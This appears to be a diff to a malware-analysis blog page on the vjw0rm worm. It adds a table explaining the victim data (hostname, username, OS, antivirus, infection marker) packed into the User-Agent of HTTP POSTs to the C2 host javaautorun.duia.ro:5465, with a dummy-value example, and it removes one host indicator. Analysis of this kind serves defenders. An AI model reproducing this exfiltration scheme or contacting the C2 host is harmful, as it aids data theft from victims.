@@ -104,7 +104,7 @@
     
     
     "mainEntityOfPage": "true",
-    "wordCount": "2394"
+    "wordCount": "2521"
   }]
   </script>
 
@@ -496,7 +496,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2394 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
+  <time datetime="2022-11-29 00:00:00 &#43;0000 UTC">November 29, 2022</time><span class="px-2 text-primary-500">&middot;</span><span>2521 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">12 mins</span><span class="px-2 text-primary-500">&middot;</span>
 
 
   
@@ -925,8 +925,55 @@ WScript.Quit(1);
 <p>The User-Agent string is used to supply the C2 domain with information recovered from the victim machine</p>
 <div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-HTTP" data-lang="HTTP"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /Vre <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
 </span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">javaautorun.duia.ro:5465</span>
-</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">9/21\COMPUTER-NAME\USERNAME\Operating_System\AntiVirus\NT\reg_key_exists</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">[campaign_identifier]\[computer_name]\[user_name]\[operating_system]\[anti_virus]\[vbc_exists]\[previously_infected]</span>
 </span></span></code></pre></div><p>Note: the values would reflect the actual data collected from the victim host</p>
+<table>
+<thead>
+<tr>
+<th>Value</th>
+<th>Definition</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>campaign_identifier</td>
+<td>Allows identification of the script that infected the endpoint. Can be renamed.</td>
+</tr>
+<tr>
+<td>computer_name</td>
+<td>Hostname of computer. Taken from the environment variables of the infected machine</td>
+</tr>
+<tr>
+<td>user_name</td>
+<td>Username that ran the script. Taken from the environment variables of the infected machine</td>
+</tr>
+<tr>
+<td>operating_system</td>
+<td>Returns the operating system version</td>
+</tr>
+<tr>
+<td>anti_virus</td>
+<td>Returns the name of the anti-virus running on infected system if any</td>
+</tr>
+<tr>
+<td>vbc_exists</td>
+<td>Checks for Visual Basic Compiler within the .NET Framework folder on disk</td>
+</tr>
+<tr>
+<td>previously_infected</td>
+<td>Checks for the presence of the vjw0rm registry key on the host</td>
+</tr>
+<tr>
+<td><em>Figure 11: Breakdown of User-Agent String values</em></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+<p>Figure 12 shows what data is transmitted to the C2 infrastructure through the POST request using dummy values.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /Vre <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">javaautorun.duia.ro:5465</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">9/21\USER-PC\Bob\Windows 10 20H2\undefined\YES\NO</span>
+</span></span></code></pre></div><p><em>Figure 12: HTTP Post with dummy values</em></p>
 <div id="host-indicators" class="anchor">Host Indicators></div>
 <h3 class="relative group">Host Indicators 
     <span
@@ -943,10 +990,6 @@ WScript.Quit(1);
 </tr>
 </thead>
 <tbody>
-<tr>
-<td><code>vbc.exe</code></td>
-<td><code>\Microsoft.NET\Framework\v2.0.50727\vbc.exe</code></td>
-</tr>
 <tr>
 <td>vjw0rm</td>
 <td><code>HKCU\vjw0rm</code></td>
@@ -1454,7 +1497,7 @@ WScript.Quit(1);
     
     <p class="text-sm text-neutral-500 dark:text-neutral-400">
       &copy;
-      2022
+      2023
       polaryse
     </p>
     
